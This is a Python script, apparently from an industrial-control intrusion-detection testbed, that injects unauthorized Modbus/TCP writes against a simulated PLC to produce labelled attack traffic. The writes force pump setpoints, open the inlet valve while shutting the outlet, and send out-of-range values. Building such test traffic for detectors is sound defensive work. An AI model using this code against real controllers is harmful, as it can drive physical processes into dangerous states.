"""
Command-injection attack against the Modbus/TCP PLC.

Threat model: an attacker who can reach the PLC crafts unauthorized write
requests directly - no operator, no HMI involvement - to drive the process to
a dangerous state. Because Modbus/TCP accepts any well-formed request from any
source, these land as legitimate control actions.

Injected actions (all writes to actuator/setpoint addresses):
  * FC6  - force pump setpoint to an extreme value (100%, and 0%).
  * FC5  - force the inlet valve open and the outlet valve shut (fill the
           tank while blocking its drain - an overflow-tending state).
  * FC16 - a multi-register block write pushing setpoint + level together,
           the kind of one-shot state change an attacker uses to move several
           points before an operator can react.
  * FC6  - an out-of-band value write (setpoint far above the plausible
           operating band) to exercise the detectors' value-range checks.

It uses an ordinary ephemeral source port and reports the actual port on
stdout (`SOURCE_PORT=<n>`) so the orchestrator can record it as ground truth.

Usage (normally invoked by attacks/run_scenario.py):
    python attacks/command_injection.py
"""

import socket
import sys
import time
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent))
from modbus_frames import (  # noqa: E402
    write_single_register, write_single_coil, write_multiple_registers,
)

TAP_HOST = "127.0.0.1"
TAP_PORT = 5021

HR_LEVEL = 0
HR_PUMP_SETPOINT = 1
COIL_INLET_VALVE = 0
COIL_OUTLET_VALVE = 1

SPACING = 0.5                  # seconds between injected commands


def connect() -> socket.socket:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((TAP_HOST, TAP_PORT))
    return sock


def send(sock: socket.socket, frame: bytes, describe: str) -> None:
    sock.sendall(frame)
    try:
        sock.recv(256)
    except OSError:
        pass
    print(f"[inject] {describe}")
    time.sleep(SPACING)


def main() -> None:
    sock = connect()
    source_port = sock.getsockname()[1]
    # Reported on stdout so the orchestrator can label this session's frames.
    print(f"SOURCE_PORT={source_port}", flush=True)
    print(f"[inject] connected via tap {TAP_HOST}:{TAP_PORT} "
          f"(source port {source_port})")

    txid = 0x7000
    # Attacker manages its own transaction IDs, incrementing like a real master
    # would - so, unlike the replay, these look fresh; it's the *content and
    # source* that are unauthorized, not the framing.
    send(sock, write_single_register(txid, HR_PUMP_SETPOINT, 100),
         "FC6 forced pump setpoint -> 100%")
    txid += 1
    send(sock, write_single_coil(txid, COIL_INLET_VALVE, on=True),
         "FC5 forced inlet valve OPEN")
    txid += 1
    send(sock, write_single_coil(txid, COIL_OUTLET_VALVE, on=False),
         "FC5 forced outlet valve SHUT (block the drain)")
    txid += 1
    send(sock, write_multiple_registers(txid, HR_LEVEL, [999, 100]),
         "FC16 block write -> level=999, setpoint=100")
    txid += 1
    send(sock, write_single_register(txid, HR_PUMP_SETPOINT, 60000),
         "FC6 out-of-range setpoint -> 60000 (value-range probe)")
    txid += 1
    send(sock, write_single_register(txid, HR_PUMP_SETPOINT, 0),
         "FC6 forced pump setpoint -> 0% (stop the pump)")

    sock.close()
    print("[inject] done.")


if __name__ == "__main__":
    main()
